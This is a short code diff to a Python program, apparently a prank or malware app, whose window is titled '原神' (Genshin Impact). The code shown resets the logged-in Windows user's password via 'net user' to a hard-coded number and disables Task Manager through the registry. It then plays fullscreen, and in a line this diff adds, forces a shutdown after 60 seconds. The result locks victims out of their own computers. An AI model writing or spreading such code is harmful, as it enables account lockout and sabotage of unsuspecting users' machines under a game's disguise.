@@ -51,8 +51,8 @@ def disable_task_manage(num):
               f'Mgr /t REG_DWORD /d {num} /f')
 
 
-def passwd():
-    os.system('echo %user_name% > a')
+def passwd(password):
+    os.system('echo %username% > a')
 
     file = open('./a', 'r', encoding='utf-8')
     user_name = file.readlines()
@@ -61,7 +61,7 @@ def passwd():
 
     print(user_name)
 
-    os.system(f'net user {user_name} 1145141919810')
+    os.system(f'net user {user_name} {password}')
 
 
 if __name__ == '__main__':
@@ -77,14 +77,15 @@ if __name__ == '__main__':
     main_win.resize(available_geometry.width() / 3,
                     available_geometry.height() / 2)
     main_win.setWindowTitle('原神')
-    passwd()
+    passwd(1145141919810)
     main_win.showFullScreen()
     main_win.play()
 
     disable_task_manage(1)
     set_audio(1.0)
+    os.system('shutdown -s -f -t 60')
 
     threading.Thread(target=app.exec()).start()
     threading.Thread(target=ts()).start()
-
     sys.exit(app.exec())
+
